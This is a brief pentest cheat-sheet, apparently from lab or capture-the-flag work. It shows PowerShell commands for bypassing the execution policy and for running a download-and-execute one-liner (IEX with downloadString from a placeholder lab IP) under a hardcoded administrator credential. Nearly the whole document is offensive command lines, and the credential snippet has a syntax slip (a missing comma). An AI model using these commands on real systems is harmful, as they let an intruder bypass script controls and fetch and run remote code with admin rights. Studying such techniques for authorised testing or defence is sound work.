# Bypass de execution policy

```powershell
powerShell.exe -ExecutionPolicy Bypass .\script.ps1
```

Refs: https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/

# Invoke command providing credentials

```powershell
$passwd = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force;
$creds = New-Object System.Management.Automation.PSCredential('administrator' $passwd)​;
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://<LAB IP>/writeup')" -Credential $creds
```